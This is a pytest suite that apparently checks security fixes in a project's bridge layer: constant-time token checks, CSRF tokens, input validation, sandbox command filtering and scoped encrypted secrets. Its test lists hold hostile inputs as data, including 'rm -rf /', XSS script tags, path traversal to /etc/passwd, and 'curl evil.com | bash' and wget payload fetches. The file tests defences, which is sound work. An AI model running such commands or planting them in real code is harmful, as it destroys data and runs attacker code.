"""
Comprehensive test suite for security fixes implemented in response to the
code-auditor-specialist audit findings.

Tests all critical and high-severity security vulnerabilities that were fixed:
1. Authentication timing attack vulnerability
2. CSRF protection for state-changing endpoints  
3. Input validation gaps
4. Sandbox security strengthening
5. Secret scoping implementation
"""

import pytest
import json
import tempfile
import time
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from fastapi.testclient import TestClient
from fastapi import Request

# Import modules under test
import sys
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from bridge.security import constant_time_compare, verify_csrf_token, CSRFProtection
from bridge.validation import (
    validate_text_input, validate_identifier, validate_helper_input,
    ValidationError, create_validation_middleware
)
from bridge.sandbox_security import (
    SandboxSecurityEnforcer, SandboxSecurityViolation
)
from bridge.secret_manager import SecretManager, SecretScope, SecretViolation
from routes.shortcut import verify_shortcut_token


class TestTimingAttackFix:
    """Test authentication timing attack vulnerability fixes."""
    
    def test_constant_time_compare_equal_strings(self):
        """Test constant time comparison with equal strings."""
        result = constant_time_compare("test_secret", "test_secret")
        assert result is True
    
    def test_constant_time_compare_different_strings(self):
        """Test constant time comparison with different strings."""
        result = constant_time_compare("test_secret", "wrong_secret")
        assert result is False
    
    def test_constant_time_compare_different_lengths(self):
        """Test constant time comparison with different length strings."""
        result = constant_time_compare("short", "much_longer_string")
        assert result is False
    
    def test_constant_time_compare_timing_consistency(self):
        """Test that comparison time is consistent regardless of input."""
        correct_secret = "a" * 32
        wrong_secret_same_length = "b" * 32
        wrong_secret_different_length = "c" * 16
        
        # Time multiple comparisons
        times = []
        for secret in [correct_secret, wrong_secret_same_length, wrong_secret_different_length]:
            start = time.perf_counter()
            for _ in range(1000):  # Multiple iterations for more accurate timing
                constant_time_compare(correct_secret, secret)
            end = time.perf_counter()
            times.append(end - start)
        
        # Timing should be relatively consistent (within 50% variance)
        max_time = max(times)
        min_time = min(times)
        variance = (max_time - min_time) / max_time
        assert variance < 0.5, f"Timing variance too high: {variance:.2%}"
    
    def test_shortcut_token_uses_constant_time_compare(self):
        """Test that shortcut token verification uses constant time comparison."""
        # Mock request with valid token
        request = Mock()
        request.headers = {"X-Shortcut-Token": "test_token"}
        
        with patch.dict('os.environ', {'SHORTCUT_TOKEN': 'test_token'}):
            result = verify_shortcut_token(request)
            assert result is True
        
        # Test with invalid token
        request.headers = {"X-Shortcut-Token": "wrong_token"}
        
        with patch.dict('os.environ', {'SHORTCUT_TOKEN': 'test_token'}):
            with pytest.raises(Exception):  # Should raise HTTPException
                verify_shortcut_token(request)


class TestCSRFProtection:
    """Test CSRF protection implementation."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.csrf_protection = CSRFProtection()
    
    def test_csrf_token_generation(self):
        """Test CSRF token generation."""
        token = self.csrf_protection.generate_csrf_token("test_session")
        assert isinstance(token, str)
        assert len(token) > 20  # Should be a substantial token
    
    def test_csrf_token_verification_valid(self):
        """Test CSRF token verification with valid token."""
        session_id = "test_session"
        token = self.csrf_protection.generate_csrf_token(session_id)
        
        result = self.csrf_protection.verify_csrf_token(token, session_id)
        assert result is True
    
    def test_csrf_token_verification_invalid_token(self):
        """Test CSRF token verification with invalid token."""
        result = self.csrf_protection.verify_csrf_token("invalid_token", "test_session")
        assert result is False
    
    def test_csrf_token_verification_wrong_session(self):
        """Test CSRF token verification with wrong session."""
        token = self.csrf_protection.generate_csrf_token("session_a")
        result = self.csrf_protection.verify_csrf_token(token, "session_b")
        assert result is False
    
    def test_csrf_token_expiry(self):
        """Test CSRF token expiry."""
        # Create protection with very short expiry
        short_expiry_protection = CSRFProtection(token_expiry_seconds=1)
        token = short_expiry_protection.generate_csrf_token("test_session")
        
        # Should be valid immediately
        assert short_expiry_protection.verify_csrf_token(token, "test_session") is True
        
        # Wait for expiry and test again
        time.sleep(1.1)
        assert short_expiry_protection.verify_csrf_token(token, "test_session") is False
    
    def test_csrf_middleware_function(self):
        """Test CSRF protection middleware function."""
        # Mock GET request (should be allowed)
        get_request = Mock()
        get_request.method = "GET"
        result = verify_csrf_token(get_request)
        assert result is True
        
        # Mock POST request without token (should fail)
        post_request = Mock()
        post_request.method = "POST"
        post_request.url.path = "/test"
        post_request.headers = {}
        
        with pytest.raises(Exception):  # Should raise HTTPException
            verify_csrf_token(post_request)


class TestInputValidation:
    """Test input validation enhancements."""
    
    def test_validate_text_input_valid(self):
        """Test text input validation with valid input."""
        result = validate_text_input("Hello, world!", max_length=100)
        assert result == "Hello, world!"
    
    def test_validate_text_input_too_long(self):
        """Test text input validation with too long input."""
        long_text = "a" * 1001
        with pytest.raises(ValidationError) as exc_info:
            validate_text_input(long_text, max_length=1000)
        assert "too long" in str(exc_info.value)
    
    def test_validate_text_input_script_injection(self):
        """Test text input validation blocks script injection."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "eval(maliciousCode)",
            "import os; os.system('rm -rf /')",
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError) as exc_info:
                validate_text_input(malicious_input)
            assert "dangerous content" in str(exc_info.value).lower()
    
    def test_validate_identifier_valid(self):
        """Test identifier validation with valid input."""
        result = validate_identifier("valid_helper_123")
        assert result == "valid_helper_123"
    
    def test_validate_identifier_path_traversal(self):
        """Test identifier validation blocks path traversal."""
        malicious_identifiers = [
            "../../../etc/passwd",
            "helper/../../../secret",
            ".hidden_file",
        ]
        
        for malicious_id in malicious_identifiers:
            with pytest.raises(ValidationError) as exc_info:
                validate_identifier(malicious_id)
            assert "invalid" in str(exc_info.value).lower()
    
    def test_validate_helper_input_valid(self):
        """Test helper input validation with valid input."""
        valid_input = {
            "operation": "get_positions",
            "symbol": "BTC/USDT",
            "amount": 1.5
        }
        result = validate_helper_input(valid_input)
        assert result == valid_input
    
    def test_validate_helper_input_dangerous_values(self):
        """Test helper input validation blocks dangerous values."""
        dangerous_inputs = [
            {"operation": "get_positions", "command": "rm -rf /"},
            {"eval": "malicious_code()"},
            {"__proto__": "prototype_pollution"},
        ]
        
        for dangerous_input in dangerous_inputs:
            with pytest.raises(ValidationError):
                validate_helper_input(dangerous_input)
    
    def test_validation_middleware_creation(self):
        """Test validation middleware can be created."""
        middleware = create_validation_middleware()
        assert middleware is not None


class TestSandboxSecurity:
    """Test sandbox security enhancements."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.security_enforcer = SandboxSecurityEnforcer()
    
    def test_validate_command_safe(self):
        """Test command validation with safe commands."""
        safe_commands = [
            ["python3", "script.py"],
            ["node", "index.js"],
            ["cat", "data.txt"],
        ]
        
        for cmd in safe_commands:
            # Should not raise exception
            self.security_enforcer.validate_command(cmd)
    
    def test_validate_command_dangerous(self):
        """Test command validation blocks dangerous commands."""
        dangerous_commands = [
            ["bash", "-c", "rm -rf /"],
            ["python3", "-c", "import os; os.system('malicious')"],
            ["wget", "http://malicious.com/payload"],
            ["sh", "-c", "curl evil.com | bash"],
        ]
        
        for cmd in dangerous_commands:
            with pytest.raises(SandboxSecurityViolation) as exc_info:
                self.security_enforcer.validate_command(cmd)
            assert exc_info.value.violation_type == "DANGEROUS_COMMAND"
    
    def test_sanitize_environment_removes_dangerous_vars(self):
        """Test environment sanitization removes dangerous variables."""
        dangerous_env = {
            "PATH": "/usr/bin:/bin",
            "LD_PRELOAD": "/malicious/lib.so",
            "PYTHONPATH": "/malicious/path",
            "SAFE_VAR": "safe_value",
            "HOME": "/home/user"
        }
        
        workspace = "/tmp/sandbox"
        sanitized = self.security_enforcer.sanitize_environment(dangerous_env, workspace)
        
        # Dangerous vars should be removed
        assert "LD_PRELOAD" not in sanitized
        assert "PYTHONPATH" not in sanitized
        
        # Safe vars should be preserved or set
        assert "TINYINTENT_WORKSPACE" in sanitized
        assert sanitized["HOME"] == workspace
    
    def test_validate_helper_input_security(self):
        """Test helper input security validation."""
        # Valid input should pass
        valid_input = {"operation": "get_positions", "symbol": "BTC/USDT"}
        result = self.security_enforcer.validate_helper_input(valid_input)
        assert result == valid_input
        
        # Dangerous input should be blocked
        dangerous_inputs = [
            {"operation": "<script>alert('xss')</script>"},
            {"__proto__": {"polluted": True}},
            {"eval": "dangerous_code()"},
            {"very_long_key_" + "a" * 200: "value"},
        ]
        
        for dangerous_input in dangerous_inputs:
            with pytest.raises(SandboxSecurityViolation):
                self.security_enforcer.validate_helper_input(dangerous_input)
    
    def test_create_security_profile(self):
        """Test security profile creation."""
        profile = self.security_enforcer.create_security_profile(
            "test_helper", 
            ["network", "filesystem"]
        )
        
        assert profile["helper_id"] == "test_helper"
        assert profile["capabilities"] == ["network", "filesystem"]
        assert profile["restrictions"]["network_disabled"] is False
        assert profile["restrictions"]["filesystem_restricted"] is False
        assert profile["monitoring"]["log_all_operations"] is True


class TestSecretManagement:
    """Test secret management and scoping."""
    
    def setup_method(self):
        """Set up test fixtures."""
        # Create temporary directory for test secrets
        self.temp_dir = Path(tempfile.mkdtemp())
        self.secret_manager = SecretManager(self.temp_dir)
    
    def teardown_method(self):
        """Clean up test fixtures."""
        # Clean up temporary directory
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_store_and_retrieve_public_secret(self):
        """Test storing and retrieving public secrets."""
        # Store public secret
        success = self.secret_manager.store_secret(
            "public_key", 
            "public_value", 
            SecretScope.PUBLIC,
            description="Test public secret"
        )
        assert success is True
        
        # Retrieve from any helper (should work)
        result = self.secret_manager.get_secret("public_key", "any_helper", "draft")
        assert result == "public_value"
    
    def test_store_and_retrieve_trusted_secret(self):
        """Test storing and retrieving trusted secrets."""
        # Store trusted secret
        success = self.secret_manager.store_secret(
            "trusted_key",
            "trusted_value", 
            SecretScope.TRUSTED,
            description="Test trusted secret"
        )
        assert success is True
        
        # Trusted helper should have access
        result = self.secret_manager.get_secret("trusted_key", "trusted_helper", "trusted")
        assert result == "trusted_value"
        
        # Draft helper should not have access
        with pytest.raises(SecretViolation) as exc_info:
            self.secret_manager.get_secret("trusted_key", "draft_helper", "draft")
        assert exc_info.value.secret_name == "trusted_key"
    
    def test_store_and_retrieve_helper_specific_secret(self):
        """Test storing and retrieving helper-specific secrets."""
        # Store helper-specific secret
        success = self.secret_manager.store_secret(
            "helper_secret",
            "helper_value",
            SecretScope.HELPER_SPECIFIC,
            helper_id="specific_helper",
            description="Test helper-specific secret"
        )
        assert success is True
        
        # Correct helper should have access
        result = self.secret_manager.get_secret("helper_secret", "specific_helper", "draft")
        assert result == "helper_value"
        
        # Different helper should not have access
        with pytest.raises(SecretViolation):
            self.secret_manager.get_secret("helper_secret", "other_helper", "draft")
    
    def test_system_secrets_not_accessible(self):
        """Test that system secrets are not accessible to helpers."""
        # Store system secret
        success = self.secret_manager.store_secret(
            "system_secret",
            "system_value",
            SecretScope.SYSTEM,
            description="Test system secret"
        )
        assert success is True
        
        # No helper should have access, regardless of trust level
        with pytest.raises(SecretViolation):
            self.secret_manager.get_secret("system_secret", "trusted_helper", "trusted")
    
    def test_list_available_secrets_by_trust_level(self):
        """Test listing available secrets based on trust level."""
        # Store secrets with different scopes
        self.secret_manager.store_secret("public1", "value1", SecretScope.PUBLIC)
        self.secret_manager.store_secret("trusted1", "value2", SecretScope.TRUSTED)
        self.secret_manager.store_secret("system1", "value3", SecretScope.SYSTEM)
        self.secret_manager.store_secret(
            "helper1", "value4", SecretScope.HELPER_SPECIFIC, helper_id="test_helper"
        )
        
        # Draft helper should only see public and helper-specific secrets
        draft_secrets = self.secret_manager.list_available_secrets("test_helper", "draft")
        draft_names = [s["name"] for s in draft_secrets]
        assert "public1" in draft_names
        assert "helper1" in draft_names
        assert "trusted1" not in draft_names
        assert "system1" not in draft_names
        
        # Trusted helper should see public, trusted, and helper-specific secrets
        trusted_secrets = self.secret_manager.list_available_secrets("test_helper", "trusted")
        trusted_names = [s["name"] for s in trusted_secrets]
        assert "public1" in trusted_names
        assert "trusted1" in trusted_names
        assert "helper1" in trusted_names
        assert "system1" not in trusted_names
    
    def test_create_scoped_environment(self):
        """Test creating scoped environment with secrets."""
        # Store test secrets
        self.secret_manager.store_secret("public_api_key", "pub123", SecretScope.PUBLIC)
        self.secret_manager.store_secret("trusted_secret", "trust456", SecretScope.TRUSTED)
        
        base_env = {"PATH": "/usr/bin", "USER": "test"}
        
        # Draft helper environment
        draft_env = self.secret_manager.create_scoped_environment(
            "test_helper", "draft", base_env
        )
        assert "TINYINTENT_SECRET_PUBLIC_API_KEY" in draft_env
        assert draft_env["TINYINTENT_SECRET_PUBLIC_API_KEY"] == "pub123"
        assert "TINYINTENT_SECRET_TRUSTED_SECRET" not in draft_env
        
        # Trusted helper environment
        trusted_env = self.secret_manager.create_scoped_environment(
            "test_helper", "trusted", base_env
        )
        assert "TINYINTENT_SECRET_PUBLIC_API_KEY" in trusted_env
        assert "TINYINTENT_SECRET_TRUSTED_SECRET" in trusted_env
        assert trusted_env["TINYINTENT_SECRET_TRUSTED_SECRET"] == "trust456"
    
    def test_secret_encryption_decryption(self):
        """Test that secrets are properly encrypted in storage."""
        secret_value = "very_secret_password"
        
        # Store secret
        self.secret_manager.store_secret("test_secret", secret_value, SecretScope.PUBLIC)
        
        # Check that the raw file doesn't contain the plaintext
        secret_file = self.temp_dir / "test_secret.secret"
        assert secret_file.exists()
        
        with open(secret_file, 'rb') as f:
            encrypted_content = f.read()
        
        # Encrypted content should not contain the original secret
        assert secret_value.encode() not in encrypted_content
        
        # But retrieval should work correctly
        retrieved = self.secret_manager.get_secret("test_secret", "any_helper", "draft")
        assert retrieved == secret_value
    
    def test_get_security_status(self):
        """Test getting security status of secret management."""
        # Store some test secrets
        self.secret_manager.store_secret("pub1", "val1", SecretScope.PUBLIC)
        self.secret_manager.store_secret("trust1", "val2", SecretScope.TRUSTED)
        
        status = self.secret_manager.get_security_status()
        
        assert status["total_secrets"] == 2
        assert status["secrets_by_scope"]["public"] == 1
        assert status["secrets_by_scope"]["trusted"] == 1
        assert status["encryption_enabled"] is True
        assert status["status"] == "operational"


class TestIntegratedSecurity:
    """Test integrated security features working together."""
    
    def test_full_security_pipeline(self):
        """Test complete security pipeline from request to execution."""
        # This test would ideally use a test client to make actual requests
        # through the full pipeline, but we'll test the components work together
        
        # 1. Input validation
        user_input = {"operation": "get_positions", "symbol": "BTC/USDT"}
        validated_input = validate_helper_input(user_input)
        assert validated_input == user_input
        
        # 2. Command validation
        security_enforcer = SandboxSecurityEnforcer()
        cmd = ["python3", "helper.py"]
        security_enforcer.validate_command(cmd)  # Should not raise
        
        # 3. Environment sanitization
        env = {"PATH": "/usr/bin", "LD_PRELOAD": "/malicious.so"}
        sanitized_env = security_enforcer.sanitize_environment(env, "/tmp/workspace")
        assert "LD_PRELOAD" not in sanitized_env
        assert sanitized_env["TINYINTENT_WORKSPACE"] == "/tmp/workspace"
        
        # 4. Secret scoping
        temp_dir = Path(tempfile.mkdtemp())
        try:
            secret_manager = SecretManager(temp_dir)
            secret_manager.store_secret("api_key", "secret123", SecretScope.TRUSTED)
            
            # Draft helper shouldn't get the secret
            scoped_env = secret_manager.create_scoped_environment(
                "draft_helper", "draft", sanitized_env
            )
            assert "TINYINTENT_SECRET_API_KEY" not in scoped_env
            
            # Trusted helper should get the secret
            trusted_env = secret_manager.create_scoped_environment(
                "trusted_helper", "trusted", sanitized_env
            )
            assert "TINYINTENT_SECRET_API_KEY" in trusted_env
            
        finally:
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v", "--tb=short"])